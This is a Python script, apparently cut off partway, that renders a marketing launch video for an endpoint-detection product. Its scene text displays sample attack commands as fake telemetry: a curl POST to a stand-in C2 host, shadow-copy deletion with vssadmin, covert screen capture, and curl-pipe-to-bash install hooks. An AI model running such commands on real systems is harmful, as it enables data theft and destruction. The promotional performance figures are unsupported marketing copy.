#!/usr/bin/env python3
"""
GitSentinel EDR 2.0 — Official High-Energy Launch Video Generator
================================================================
Renders a 64-second, 30fps (1920 frames), 1080p Full HD launch video
with pixel-perfect typography, aligned geometric cards, dynamic radar sweeps,
live kernel telemetry tickers, and an upbeat 124 BPM electronic soundtrack.

Deliverables:
- brag-output/brag.mp4 (64.0 seconds, 1080p H.264 + AAC)
- brag-output/brag.jpg (Crisp 1080p poster image)
- brag-output/share-copy.txt (Launch announcement text)
- Synced to root & static web directory for Vercel deployment
"""

import os
import sys
import time
import math
import wave
import subprocess
import numpy as np
from PIL import Image, ImageDraw, ImageFont

PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
OUTPUT_DIR = os.path.join(PROJECT_ROOT, "brag-output")
WORK_DIR = os.path.join(OUTPUT_DIR, "work")
STATIC_DIR = os.path.join(PROJECT_ROOT, "src", "gui", "static")
os.makedirs(WORK_DIR, exist_ok=True)
os.makedirs(STATIC_DIR, exist_ok=True)

FFMPEG_BIN = "/Users/vatsalagarwal/.gemini/antigravity/bin/ffmpeg"
if not os.path.exists(FFMPEG_BIN):
    FFMPEG_BIN = "ffmpeg"

WIDTH = 1920
HEIGHT = 1080
FPS = 30
DURATION_SEC = 64.0
TOTAL_FRAMES = int(FPS * DURATION_SEC) # 1920 frames

# ---------------------------------------------------------------------------
# COLOR PALETTE (Kinesis Engine & Lila Rule Compliant: Tinted Slate + Cyan)
# ---------------------------------------------------------------------------
COLOR_BG = (8, 12, 20)           # Deep Space Slate
COLOR_GRID = (16, 24, 40)         # Subtle Defense Grid
COLOR_CARD_BG = (13, 20, 36)      # Tinted Dark Slate Card
COLOR_CARD_BORDER = (30, 41, 59)  # Subdued Border
COLOR_ACCENT = (56, 189, 248)     # Electric Cyan (Primary)
COLOR_TEXT_MAIN = (248, 250, 252) # Pure Off-White
COLOR_TEXT_SUB = (148, 163, 184)  # Slate Subtext
COLOR_DANGER = (239, 68, 68)      # Ruby Red for Threat Warnings
COLOR_SUCCESS = (16, 185, 129)    # Emerald Green for Safe State
COLOR_WARNING = (245, 158, 11)    # Amber for Caution

# Load High-Resolution macOS Fonts
FONT_HERO = ImageFont.truetype("/System/Library/Fonts/Helvetica.ttc", 56, index=1)
FONT_TITLE = ImageFont.truetype("/System/Library/Fonts/Helvetica.ttc", 40, index=1)
FONT_SUBTITLE = ImageFont.truetype("/System/Library/Fonts/Helvetica.ttc", 22, index=0)
FONT_CARD_TITLE = ImageFont.truetype("/System/Library/Fonts/Helvetica.ttc", 24, index=1)
FONT_BODY = ImageFont.truetype("/System/Library/Fonts/Helvetica.ttc", 19, index=0)
FONT_BODY_BOLD = ImageFont.truetype("/System/Library/Fonts/Helvetica.ttc", 19, index=1)
FONT_MONO = ImageFont.truetype("/System/Library/Fonts/Menlo.ttc", 17, index=0)
FONT_MONO_BOLD = ImageFont.truetype("/System/Library/Fonts/Menlo.ttc", 17, index=1)
FONT_BADGE = ImageFont.truetype("/System/Library/Fonts/Helvetica.ttc", 14, index=1)


# ---------------------------------------------------------------------------
# 1. SYNTHESIZE 64-SECOND HIGH-ENERGY ELECTRONIC SOUNDTRACK
# ---------------------------------------------------------------------------
def generate_soundtrack():
    wav_path = os.path.join(WORK_DIR, "soundtrack.wav")
    print(f"[*] Synthesizing 64.0s electronic soundtrack at 44.1kHz stereo -> {wav_path}")
    
    sr = 44100
    duration = DURATION_SEC
    total_samples = int(sr * duration)
    t = np.linspace(0, duration, total_samples, endpoint=False)
    
    bpm = 124.0
    beat_sec = 60.0 / bpm
    total_beats = int(duration / beat_sec)
    
    left = np.zeros(total_samples, dtype=np.float32)
    right = np.zeros(total_samples, dtype=np.float32)
    
    # 1. Kick Drum (Punchy 4-on-the-floor)
    kick_len = int(sr * 0.24)
    kt = np.linspace(0, 0.24, kick_len, endpoint=False)
    kick_sample = np.sin(2 * np.pi * (45 + 135 * np.exp(-kt * 28)) * kt) * np.exp(-kt * 13) * 0.75
    
    # 2. Crisp Snare / Clap on beats 2 and 4
    snare_len = int(sr * 0.20)
    st = np.linspace(0, 0.20, snare_len, endpoint=False)
    snare_sample = (0.7 * np.random.uniform(-1, 1, snare_len) * np.exp(-st * 24) +
                    0.3 * np.sin(2 * np.pi * 210 * st) * np.exp(-st * 26)) * 0.50
    
    # 3. 16th-note Hi-Hats
    hh_len = int(sr * 0.045)
    hht = np.linspace(0, 0.045, hh_len, endpoint=False)
    hihat_sample = np.random.uniform(-1, 1, hh_len) * np.exp(-hht * 85) * 0.16
    
    # 4. Cinematic Sub Impact for scene changes (every 8 seconds / 16 beats)
    boom_len = int(sr * 1.8)
    bt = np.linspace(0, 1.8, boom_len, endpoint=False)
    boom_sample = np.sin(2 * np.pi * (35 + 60 * np.exp(-bt * 5)) * bt) * np.exp(-bt * 3) * 0.65
    
    # 5. Cyber Siren / Warning Stinger (for threat scenes)
    siren_len = int(sr * 0.6)
    sirt = np.linspace(0, 0.6, siren_len, endpoint=False)
    siren_sample = np.sin(2 * np.pi * (800 + 400 * np.sin(2 * np.pi * 8 * sirt)) * sirt) * np.exp(-sirt * 4) * 0.22

    # Populate Drum Grid
    for beat in range(total_beats):
        beat_time = beat * beat_sec
        idx = int(beat_time * sr)
        
        # Kick starts from beat 8 (approx 3.8s) through beat 124 (approx 60s)
        if 8 <= beat < 124:
            if idx + kick_len < total_samples:
                left[idx:idx + kick_len] += kick_sample
                right[idx:idx + kick_len] += kick_sample
        
        # Snare on beats 2 & 4
        if 16 <= beat < 122:
            if beat % 4 in [1, 3]:
                if idx + snare_len < total_samples:
                    left[idx:idx + snare_len] += snare_sample * 0.95
                    right[idx:idx + snare_len] += snare_sample * 1.05
                    
        # 16th Hi-Hats
        if 16 <= beat < 122:
            subdivisions = 4
            for s in range(subdivisions):
                sub_idx = idx + int(s * (beat_sec / subdivisions) * sr)
                if sub_idx + hh_len < total_samples:
                    vel = 0.9 if s == 2 else 0.6
                    pan = 0.8 if s % 2 == 0 else 1.2
                    left[sub_idx:sub_idx + hh_len] += hihat_sample * vel * pan
                    right[sub_idx:sub_idx + hh_len] += hihat_sample * vel * (2.0 - pan)
                    
        # Scene transition impacts (every 16 beats = 7.74s)
        if beat in [0, 16, 32, 48, 64, 80, 96, 112]:
            if idx + boom_len < total_samples:
                left[idx:idx + boom_len] += boom_sample
                right[idx:idx + boom_len] += boom_sample
                
        # Siren alerts during threat scenes (around beat 48 and beat 64)
        if beat in [48, 64, 80]:
            if idx + siren_len < total_samples:
                left[idx:idx + siren_len] += siren_sample * 0.8
                right[idx:idx + siren_len] += siren_sample * 1.2

    # 6. Synth Bassline (Driving 8th notes)
    notes_f = [43.65, 43.65, 51.91, 48.99, 43.65, 43.65, 58.27, 51.91] # Hz
    bass_track = np.zeros(total_samples, dtype=np.float32)
    eighth_sec = beat_sec / 2.0
    total_eighths = int(duration / eighth_sec)
    
    for e in range(total_eighths):
        if 16 <= e < total_eighths - 8:
            e_idx = int(e * eighth_sec * sr)
            freq = notes_f[e % len(notes_f)]
            e_len = int(sr * (eighth_sec * 0.85))
            if e_idx + e_len < total_samples:
                et = np.linspace(0, eighth_sec * 0.85, e_len, endpoint=False)
                saw = (2 * (et * freq - np.floor(et * freq + 0.5))) * 0.15
                sub = np.sin(2 * np.pi * freq * et) * 0.28
                note = (saw + sub) * np.exp(-et * 6)
                bass_track[e_idx:e_idx + e_len] += note
                
    left += bass_track * 0.95
    right += bass_track * 1.05

    # 7. Ambient High Lead Arpeggio
    arp_notes = [349.23, 415.30, 523.25, 622.25, 698.46, 523.25, 415.30, 466.16]
    arp_sec = beat_sec / 4.0
    total_arps = int(duration / arp_sec)
    for a in range(total_arps):
        if 32 <= a < total_arps - 16:
            a_idx = int(a * arp_sec * sr)
            freq = arp_notes[a % len(arp_notes)]
            a_len = int(sr * (arp_sec * 0.7))
            if a_idx + a_len < total_samples:
                at = np.linspace(0, arp_sec * 0.7, a_len, endpoint=False)
                lead = np.sin(2 * np.pi * freq * at) * np.exp(-at * 12) * 0.09
                pan_l = 0.5 + 0.4 * np.sin(a * 0.3)
                left[a_idx:a_idx + a_len] += lead * pan_l
                right[a_idx:a_idx + a_len] += lead * (1.0 - pan_l)

    # 8. Master Fade In & Fade Out
    fade_in_len = int(sr * 1.2)
    fade_out_len = int(sr * 2.5)
    fade_in = np.linspace(0, 1, fade_in_len)
    fade_out = np.linspace(1, 0, fade_out_len)
    
    left[:fade_in_len] *= fade_in
    right[:fade_in_len] *= fade_in
    left[-fade_out_len:] *= fade_out
    right[-fade_out_len:] *= fade_out

    # Normalize audio cleanly without clipping
    peak = max(np.max(np.abs(left)), np.max(np.abs(right)), 1e-4)
    target_peak = 0.92
    left = (left / peak) * target_peak
    right = (right / peak) * target_peak
    
    # Interleave stereo 16-bit PCM
    stereo = np.empty((total_samples * 2,), dtype=np.int16)
    stereo[0::2] = (left * 32767).astype(np.int16)
    stereo[1::2] = (right * 32767).astype(np.int16)
    
    with wave.open(wav_path, "wb") as wf:
        wf.setnchannels(2)
        wf.setsampwidth(2)
        wf.setframerate(sr)
        wf.writeframes(stereo.tobytes())
        
    print(f"[✓] Audio synthesized successfully ({duration}s, {total_samples} samples)")
    return wav_path


# ---------------------------------------------------------------------------
# 2. EXACT TEXT WRAPPING & ALIGNMENT HELPERS
# ---------------------------------------------------------------------------
def wrap_text_exact(draw, text, font, max_width):
    """Wraps text word-by-word with true measured textbbox width."""
    words = text.split(" ")
    lines = []
    current_line = []
    for word in words:
        test_line = " ".join(current_line + [word])
        w = draw.textbbox((0, 0), test_line, font=font)[2]
        if w <= max_width:
            current_line.append(word)
        else:
            if current_line:
                lines.append(" ".join(current_line))
                current_line = [word]
            else:
                lines.append(word)
    if current_line:
        lines.append(" ".join(current_line))
    return lines


def draw_centered_text(draw, y, text, font, fill):
    """Draws horizontally centered text with exact mathematical precision."""
    bbox = draw.textbbox((0, 0), text, font=font)
    text_w = bbox[2] - bbox[0]
    x = (WIDTH - text_w) // 2
    draw.text((x, y), text, font=font, fill=fill)
    return y + (bbox[3] - bbox[1])


def draw_shield_icon(draw, cx, cy, size=16, color=COLOR_ACCENT):
    """Draws a crisp geometric shield polygon with zero missing font glyph issues."""
    half = size // 2
    pts = [
        (cx - half, cy - half),
        (cx + half, cy - half),
        (cx + half, cy + half // 2),
        (cx, cy + half),
        (cx - half, cy + half // 2)
    ]
    draw.polygon(pts, fill=color)
    # Inner checkmark / core
    draw.polygon([
        (cx - half + 3, cy - half + 3),
        (cx + half - 3, cy - half + 3),
        (cx + half - 3, cy + half // 2 - 2),
        (cx, cy + half - 3),
        (cx - half + 3, cy + half // 2 - 2)
    ], fill=(8, 12, 20))
    draw.line([(cx - 3, cy), (cx, cy + 3), (cx + 4, cy - 3)], fill=color, width=2)


def draw_card(draw, x, y, w, h, title, subtitle=None, items=None, accent_color=COLOR_ACCENT, badge_text=None, border_color=COLOR_CARD_BORDER):
    """Draws a mathematically aligned card where the badge has its own dedicated top row to prevent ANY text collision."""
    # Base Card surface
    draw.rounded_rectangle((x, y, x + w, y + h), radius=16, fill=COLOR_CARD_BG, outline=border_color, width=2)
    
    cur_y = y + 24
    # Dedicated Badge Row (Top row: gives badge breathing room and leaves title full width)
    if badge_text:
        badge_box = draw.textbbox((0, 0), badge_text, font=FONT_BADGE)
        b_w = badge_box[2] - badge_box[0] + 16
        b_h = 24
        draw.rounded_rectangle((x + 36, cur_y, x + 36 + b_w, cur_y + b_h), radius=6,
                               fill=(accent_color[0]//5, accent_color[1]//5, accent_color[2]//5),
                               outline=accent_color, width=1)
        draw.text((x + 44, cur_y + 4), badge_text, font=FONT_BADGE, fill=accent_color)
        cur_y += 34
    
    # Card Title (Has FULL width of the card)
    title_lines = wrap_text_exact(draw, title, FONT_CARD_TITLE, w - 72)
    for t_line in title_lines:
        draw.text((x + 36, cur_y), t_line, font=FONT_CARD_TITLE, fill=COLOR_TEXT_MAIN)
        cur_y += 32
    cur_y += 6
    
    # Card Subtitle
    if subtitle:
        sub_lines = wrap_text_exact(draw, subtitle, FONT_SUBTITLE, w - 72)
        for line in sub_lines:
            draw.text((x + 36, cur_y), line, font=FONT_SUBTITLE, fill=COLOR_TEXT_SUB)
            cur_y += 28
        cur_y += 10
        
    # Divider line
    draw.line([(x + 36, cur_y), (x + w - 36, cur_y)], fill=(22, 32, 53), width=1)
    cur_y += 22
    
    # Items / Bullets / Code blocks
    if items:
        for item in items:
            prefix = item.get("prefix", "•")
            text = item.get("text", "")
            color = item.get("color", COLOR_TEXT_MAIN)
            mono = item.get("mono", False)
            used_font = FONT_MONO if mono else FONT_BODY
            
            prefix_w = draw.textbbox((0, 0), prefix, font=FONT_BODY_BOLD)[2] + 12
            draw.text((x + 36, cur_y), prefix, font=FONT_BODY_BOLD, fill=accent_color)
            
            item_lines = wrap_text_exact(draw, text, used_font, w - 72 - prefix_w)
            for idx, line in enumerate(item_lines):
                line_x = x + 36 + prefix_w
                draw.text((line_x, cur_y), line, font=used_font, fill=color)
                cur_y += 26
            cur_y += 12


def draw_header_footer(draw, frame_idx, act_num, act_title):
    """Draws top system bar and bottom timeline progress bar with guaranteed glyphs and alignment."""
    # Top Header Vector Shield
    draw_shield_icon(draw, 100, 52, size=18, color=COLOR_ACCENT)
    draw.text((120, 42), "GITSENTINEL EDR // BEHAVIORAL THREAT MATRIX", font=FONT_MONO_BOLD, fill=COLOR_TEXT_MAIN)
    
    # Act Pill (Center)
    act_str = f"ACT {act_num:02d} // {act_title.upper()}"
    act_box = draw.textbbox((0, 0), act_str, font=FONT_BADGE)
    act_w = act_box[2] - act_box[0] + 28
    act_x = (WIDTH - act_w) // 2
    draw.rounded_rectangle((act_x, 38, act_x + act_w, 68), radius=15, fill=(16, 26, 46), outline=COLOR_ACCENT, width=1)
    draw.text((act_x + 14, 45), act_str, font=FONT_BADGE, fill=COLOR_ACCENT)
    
    # Right Status
    sec_elapsed = frame_idx / FPS
    time_str = f"SYSTEM: ARMED • {sec_elapsed:04.1f}s / {DURATION_SEC:04.1f}s"
    draw.text((WIDTH - 420, 42), time_str, font=FONT_MONO, fill=COLOR_TEXT_SUB)
    
    # Header Divider
    draw.line([(80, 86), (WIDTH - 80, 86)], fill=(22, 32, 53), width=1)
    
    # Bottom Progress Bar
    pct = min(frame_idx / TOTAL_FRAMES, 1.0)
    bar_y = 1040
    draw.line([(80, bar_y), (WIDTH - 80, bar_y)], fill=(22, 32, 53), width=4)
    fill_x = 80 + int((WIDTH - 160) * pct)
    if fill_x > 80:
        draw.line([(80, bar_y), (fill_x, bar_y)], fill=COLOR_ACCENT, width=4)
        draw.ellipse((fill_x - 4, bar_y - 4, fill_x + 4, bar_y + 4), fill=(255, 255, 255))


# ---------------------------------------------------------------------------
# 3. SCENE RENDERING PIPELINE (8 HIGH-IMPACT SCENES ACROSS 64 SECONDS)
# ---------------------------------------------------------------------------
def render_frame(frame_idx, base_canvas):
    """Renders a single frame at 1920x1080 resolution."""
    frame = base_canvas.copy()
    draw = ImageDraw.Draw(frame)
    sec = frame_idx / FPS
    
    # Subtle moving scanline
    scanline_y = int((frame_idx * 7) % HEIGHT)
    draw.line([(0, scanline_y), (WIDTH, scanline_y)], fill=(56, 189, 248), width=1)
    
    # =========================================================================
    # SCENE 1: THE COLD OPEN (0.0s - 8.0s, Frames 0 - 240)
    # =========================================================================
    if sec < 8.0:
        draw_header_footer(draw, frame_idx, 1, "The Cold Open // Threat Landscape")
        
        draw.text((100, 115), "IN 2026, CYBER THREATS TRANSCENDED TRADITIONAL DEFENSES", font=FONT_TITLE, fill=COLOR_TEXT_MAIN)
        draw.text((100, 168), "Autonomous AI agents, stealth surveillance spyware, and mutating ransomware operate invisibly.", font=FONT_SUBTITLE, fill=COLOR_TEXT_SUB)
        
        draw_card(draw, 100, 220, 830, 770,
                  title="THE SILENT INFECTION VECTOR",
                  subtitle="Modern attacks don't drop obvious binary payloads. They abuse signed CLI tools and low-level system sockets.",
                  items=[
                      {"prefix": "[AI ESCAPE]", "text": "LLM agents breaking out of docker sandbox sockets into host user space.", "color": COLOR_DANGER},
                      {"prefix": "[SPYWARE]", "text": "Covert 'CTRL' movie-style webcam, microphone, and keystroke interceptors.", "color": COLOR_WARNING},
                      {"prefix": "[MUTATION]", "text": "WannaCry-style polymorphic encryptors altering hashes every 30 seconds.", "color": COLOR_DANGER},
                      {"prefix": "[SUPPLY-CHAIN]", "text": "Rogue git commits and postinstall package hooks exfiltrating API tokens.", "color": COLOR_WARNING},
                      {"prefix": "[TELEMETRY]", "text": "Standard AV cannot detect these because legitimate binaries are being abused.", "color": COLOR_TEXT_SUB}
                  ],
                  accent_color=COLOR_DANGER,
                  badge_text="CRITICAL ALERT",
                  border_color=(120, 30, 40))
        
        log_offset = (frame_idx // 2) % 6
        logs = [
            f"[+0.{frame_idx%99:02d}s] WARN  ptrace_attach() target=host_pid:1049 namespace=host",
            f"[+0.{frame_idx%88:02d}s] ALERT docker.sock read: POST /v1.41/containers/create",
            f"[+0.{frame_idx%77:02d}s] WARN  vssadmin.exe delete shadows /all /quiet",
            f"[+0.{frame_idx%66:02d}s] ALERT AV_SCAN_BYPASS: signature_hash=UNKNOWN (Mutated)",
            f"[+0.{frame_idx%55:02d}s] WARN  screencapture -x -C /tmp/.sc_cache.png",
            f"[+0.{frame_idx%44:02d}s] ALERT git config user.email -> attacker@darknet.onion",
            f"[+0.{frame_idx%33:02d}s] WARN  curl -X POST https://c2.exfil.io/payload.tar.gz"
        ]
        items_right = [{"prefix": ">", "text": log, "color": COLOR_ACCENT, "mono": True} for log in logs[log_offset:log_offset+5]]
        
        draw_card(draw, 990, 220, 830, 770,
                  title="LIVE KERNEL TELEMETRY FEED",
                  subtitle="Raw host events streaming through OS audit facilities before traditional AV even starts.",
                  items=items_right,
                  accent_color=COLOR_ACCENT,
                  badge_text="TELEMETRY STREAM")

    # =========================================================================
    # SCENE 2: THE LEGACY ANTIVIRUS BLINDSPOT (8.0s - 16.0s, Frames 240 - 480)
    # =========================================================================
    elif sec < 16.0:
        draw_header_footer(draw, frame_idx, 2, "The Blindspot // Legacy Antivirus")
        
        draw.text((100, 115), "WHY LEGACY ANTIVIRUS HAS A 100% ARCHITECTURAL BLINDSPOT", font=FONT_TITLE, fill=COLOR_TEXT_MAIN)
        draw.text((100, 168), "Traditional antivirus scans disk hashes. Modern attacks execute in memory and use benign tools.", font=FONT_SUBTITLE, fill=COLOR_TEXT_SUB)
        
        draw_card(draw, 100, 220, 830, 770,
                  title="LEGACY ANTIVIRUS ARCHITECTURE",
                  subtitle="Built in the 1990s for static .exe files on hard drives.",
                  items=[
                      {"prefix": "[FAIL]", "text": "Relies entirely on known VirusTotal file hashes.", "color": COLOR_DANGER},
                      {"prefix": "[FAIL]", "text": "Bypassed immediately when code is mutated or compiled locally.", "color": COLOR_DANGER},
                      {"prefix": "[FAIL]", "text": "Completely blind to Docker socket IPC and AI container escapes.", "color": COLOR_DANGER},
                      {"prefix": "[FAIL]", "text": "Trusts signed developer binaries like python, git, curl, and ssh.", "color": COLOR_DANGER},
                      {"prefix": "[FAIL]", "text": "Massive kernel driver overhead causing 20%+ CPU lag & battery drain.", "color": COLOR_DANGER}
                  ],
                  accent_color=COLOR_DANGER,
                  badge_text="LEGACY OBSOLETE")
                  
        draw_card(draw, 990, 220, 830, 770,
                  title="MODERN BEHAVIORAL EXPLOITATION",
                  subtitle="How modern threat actors bypass traditional file scanners with ease.",
                  items=[
                      {"prefix": "[TTP]", "text": "Living-off-the-Land (LotL): Exploiting native OS binaries for covert malice.", "color": COLOR_WARNING},
                      {"prefix": "[TTP]", "text": "Zero-Day Mutations: Hash alterations render static signature databases useless.", "color": COLOR_WARNING},
                      {"prefix": "[TTP]", "text": "Subprocess Lineage Hiding: Spawning orphaned processes detached from TTY.", "color": COLOR_WARNING},
                      {"prefix": "[TTP]", "text": "Unauthorized Git Injections: Secretly authoring and pushing backdoor PRs.", "color": COLOR_WARNING},
                      {"prefix": "[EDR]", "text": "The Solution: Real-time behavioral process lineage & execution auditing.", "color": COLOR_SUCCESS}
                  ],
                  accent_color=COLOR_WARNING,
                  badge_text="ACTIVE ATTACK TTPs")

    # =========================================================================
    # SCENE 3: THE REVEAL // GITSENTINEL EDR 2.0 (16.0s - 24.0s, Frames 480 - 720)
    # =========================================================================
    elif sec < 24.0:
        draw_header_footer(draw, frame_idx, 3, "The Solution // GitSentinel EDR 2.0")
        
        # Perfectly Centered Hero Headline & Subhead
        draw_centered_text(draw, 115, "INTRODUCING GITSENTINEL EDR 2.0", FONT_HERO, COLOR_TEXT_MAIN)
        draw_centered_text(draw, 185, "The Universal Behavioral Threat Hunter Built for the AI & Supply-Chain Era", FONT_SUBTITLE, COLOR_ACCENT)
        
        # 3 Pillar Cards in Center (Width 540, Gap 40 -> Total 1700px, Start 110px)
        col_w = 540
        gap = 40
        start_x = (WIDTH - (3 * col_w + 2 * gap)) // 2
        
        draw_card(draw, start_x, 245, col_w, 750,
                  title="1. EVENT INGESTION",
                  subtitle="Low-overhead OS kernel hooks.",
                  items=[
                      {"prefix": "•", "text": "macOS EndpointSecurity API", "color": COLOR_TEXT_MAIN},
                      {"prefix": "•", "text": "Windows ETW & Sysmon Feeds", "color": COLOR_TEXT_MAIN},
                      {"prefix": "•", "text": "Linux eBPF & auditd journald", "color": COLOR_TEXT_MAIN},
                      {"prefix": "•", "text": "Zero Kernel Panic risk (User-space)", "color": COLOR_SUCCESS},
                      {"prefix": "•", "text": "< 0.5% average CPU overhead", "color": COLOR_ACCENT}
                  ],
                  accent_color=COLOR_ACCENT,
                  badge_text="TELEMETRY CORE")
                  
        draw_card(draw, start_x + col_w + gap, 245, col_w, 750,
                  title="2. ARCHETYPE PROFILER",
                  subtitle="Behavioral heuristic AI engine.",
                  items=[
                      {"prefix": "•", "text": "Active vs. Passive classification", "color": COLOR_TEXT_MAIN},
                      {"prefix": "•", "text": "Threat Archetype Mutation scoring", "color": COLOR_TEXT_MAIN},
                      {"prefix": "•", "text": "Parent-child process tree tracing", "color": COLOR_TEXT_MAIN},
                      {"prefix": "•", "text": "High-entropy write burst tripwires", "color": COLOR_WARNING},
                      {"prefix": "•", "text": "Unsanctioned network socket audits", "color": COLOR_ACCENT}
                  ],
                  accent_color=COLOR_SUCCESS,
                  badge_text="INTELLIGENCE ENGINE")
                  
        draw_card(draw, start_x + 2 * (col_w + gap), 245, col_w, 750,
                  title="3. AUTONOMOUS DEFENSE",
                  subtitle="Instant 1-click remediation.",
                  items=[
                      {"prefix": "•", "text": "Instant SIGSTOP / process freeze", "color": COLOR_DANGER},
                      {"prefix": "•", "text": "Cryptographic network isolation", "color": COLOR_WARNING},
                      {"prefix": "•", "text": "Automated forensic playbook generation", "color": COLOR_TEXT_MAIN},
                      {"prefix": "•", "text": "Zero-trust quarantine vault", "color": COLOR_SUCCESS},
                      {"prefix": "•", "text": "Verifiable JSON threat diagnostics", "color": COLOR_ACCENT}
                  ],
                  accent_color=COLOR_ACCENT,
                  badge_text="ACTIVE CONTAINMENT")

    # =========================================================================
    # SCENE 4: DEEP THREAT 1 // AI ESCAPE & 'CTRL' SPYWARE (24.0s - 33.0s, Frames 720 - 990)
    # =========================================================================
    elif sec < 33.0:
        draw_header_footer(draw, frame_idx, 4, "Threat Deep Dive // AI Escape & Surveillance")
        
        draw.text((100, 115), "DEEP THREAT ANALYSIS: AI BREAKOUTS & 'CTRL' SPYWARE", font=FONT_TITLE, fill=COLOR_TEXT_MAIN)
        draw.text((100, 168), "Catching the threats portrayed in movies — now manifesting in production AI environments.", font=FONT_SUBTITLE, fill=COLOR_TEXT_SUB)
        
        draw_card(draw, 100, 220, 830, 770,
                  title="THREAT #01: AI AGENT SANDBOX BREAKOUT",
                  subtitle="Autonomous LLM agents attempting privilege escalation to access host environment.",
                  items=[
                      {"prefix": "[BEHAVIOR]", "text": "Agent mounts /var/run/docker.sock to spawn privileged root sibling containers.", "color": COLOR_TEXT_MAIN},
                      {"prefix": "[INDICATOR]", "text": "Unsanctioned host bash execution outside virtualized chroot boundaries.", "color": COLOR_WARNING},
                      {"prefix": "[RISK LEVEL]", "text": "CRITICAL (Active Host Hijacking & Sandbox Escape)", "color": COLOR_DANGER},
                      {"prefix": "[ACTION]", "text": "Docker socket pipe instantly severed; container frozen; host alert triggered.", "color": COLOR_SUCCESS},
                      {"prefix": "[REMEDIAL]", "text": "chmod 000 /var/run/docker.sock && docker stop --time 0 agent_box", "color": COLOR_ACCENT, "mono": True}
                  ],
                  accent_color=COLOR_DANGER,
                  badge_text="AI THREAT DETECTED",
                  border_color=(140, 40, 50))
                  
        draw_card(draw, 990, 220, 830, 770,
                  title="THREAT #02: 'CTRL' MOVIE PERSISTENT SPYWARE",
                  subtitle="Covert background surveillance software recording screen, webcam, and keystrokes.",
                  items=[
                      {"prefix": "[BEHAVIOR]", "text": "Spawns detached background daemon listening on audio taps and screen captures.", "color": COLOR_TEXT_MAIN},
                      {"prefix": "[INDICATOR]", "text": "Iterates ~/.ssh/id_rsa, ~/.aws/credentials, and keychain databases without user prompt.", "color": COLOR_WARNING},
                      {"prefix": "[RISK LEVEL]", "text": "HIGH (Passive Data Harvesting & Covert Exfiltration)", "color": COLOR_DANGER},
                      {"prefix": "[ACTION]", "text": "Unauthorized audio/video capture threads killed; network egress blackholed.", "color": COLOR_SUCCESS},
                      {"prefix": "[REMEDIAL]", "text": "killall -9 screencapture && iptables -A OUTPUT -d c2.exfil -j DROP", "color": COLOR_ACCENT, "mono": True}
                  ],
                  accent_color=COLOR_WARNING,
                  badge_text="SPYWARE INTERCEPTED",
                  border_color=(120, 80, 30))

    # =========================================================================
    # SCENE 5: DEEP THREAT 2 // WANNACRY MUTATION (33.0s - 42.0s, Frames 990 - 1260)
    # =========================================================================
    elif sec < 42.0:
        draw_header_footer(draw, frame_idx, 5, "Threat Deep Dive // Ransomware Defense")
        
        draw.text((100, 115), "DEEP THREAT ANALYSIS: MUTATED WANNACRY RANSOMWARE", font=FONT_TITLE, fill=COLOR_TEXT_MAIN)
        draw.text((100, 168), "Canary tripwires and high-entropy write monitors catch mass encryption before drives lock.", font=FONT_SUBTITLE, fill=COLOR_TEXT_SUB)
        
        draw_card(draw, 100, 220, 830, 770,
                  title="THE ATTACK: POLYMORPHIC ENCRYPTION",
                  subtitle="Modern ransomware mutates file extensions and deletes local recovery mechanisms.",
                  items=[
                      {"prefix": "[TTP 01]", "text": "Deletes local Volume Shadow Copies: vssadmin delete shadows /all /quiet", "color": COLOR_DANGER},
                      {"prefix": "[TTP 02]", "text": "Burst encryption write entropy surges to 7.94 bits/byte across user files.", "color": COLOR_DANGER},
                      {"prefix": "[TTP 03]", "text": "Rapidly renames target files to .locked, .wncry, or encrypted extensions.", "color": COLOR_WARNING},
                      {"prefix": "[TTP 04]", "text": "Spreads laterally across local subnet via SMB port 445 exploits.", "color": COLOR_WARNING},
                      {"prefix": "[RESULT]", "text": "Legacy AV waits for hash matching; drives lock before alerts fire.", "color": COLOR_TEXT_SUB}
                  ],
                  accent_color=COLOR_DANGER,
                  badge_text="RANSOMWARE TTPs",
                  border_color=(140, 30, 40))
                  
        draw_card(draw, 990, 220, 830, 770,
                  title="GITSENTINEL RESPONSE: ZERO-TRUST LOCKDOWN",
                  subtitle="Autonomous intervention within 1.4 milliseconds of canary tripwire access.",
                  items=[
                      {"prefix": "[TRIPWIRE]", "text": "Canary decoy files deployed in common directories detect unauth access.", "color": COLOR_SUCCESS},
                      {"prefix": "[INTERCEPT]", "text": "Process tree receives immediate SIGSTOP freeze before bulk files are touched.", "color": COLOR_SUCCESS},
                      {"prefix": "[PRESERVE]", "text": "Shadow copies and recovery snapshots locked in immutable read-only mode.", "color": COLOR_ACCENT},
                      {"prefix": "[ISOLATION]", "text": "Port 445 SMB and outbound C2 socket closed instantly to stop propagation.", "color": COLOR_ACCENT},
                      {"prefix": "[RECOVERY]", "text": "Automatic zero-data-loss recovery playbook generated for user.", "color": COLOR_SUCCESS}
                  ],
                  accent_color=COLOR_SUCCESS,
                  badge_text="INSTANT CONTAINMENT",
                  border_color=(20, 100, 60))

    # =========================================================================
    # SCENE 6: DEEP THREAT 3 // SUPPLY-CHAIN & ROGUE GIT (42.0s - 50.0s, Frames 1260 - 1500)
    # =========================================================================
    elif sec < 50.0:
        draw_header_footer(draw, frame_idx, 6, "Threat Deep Dive // Git & Supply Chain")
        
        draw.text((100, 115), "SUPPLY-CHAIN INTEGRITY & UNAUTHORIZED GIT INTERCEPTION", font=FONT_TITLE, fill=COLOR_TEXT_MAIN)
        draw.text((100, 168), "Protecting your source code, CI/CD pipelines, and upstream packages from covert tampering.", font=FONT_SUBTITLE, fill=COLOR_TEXT_SUB)
        
        draw_card(draw, 100, 220, 830, 770,
                  title="SUPPLY-CHAIN PACKAGE HIJACKING",
                  subtitle="Malicious dependencies running silent execution hooks during npm/pip install.",
                  items=[
                      {"prefix": "[VECTOR]", "text": "Malicious npm 'postinstall' script executes curl | bash in background.", "color": COLOR_DANGER},
                      {"prefix": "[EXFIL]", "text": "Inspects process environment variables for GITHUB_TOKEN, AWS_KEY, and API secrets.", "color": COLOR_WARNING},
                      {"prefix": "[DEFENSE]", "text": "GitSentinel detects headless postinstall child process spawning network pipes.", "color": COLOR_SUCCESS},
                      {"prefix": "[VERDICT]", "text": "Subprocess immediately quarantined before secrets are transmitted.", "color": COLOR_ACCENT}
                  ],
                  accent_color=COLOR_WARNING,
                  badge_text="SUPPLY-CHAIN SHIELD")
                  
        draw_card(draw, 990, 220, 830, 770,
                  title="UNAUTHORIZED GIT COMMITS & ROGUE PRs",
                  subtitle="Trojans creating malicious PRs using cached developer credentials.",
                  items=[
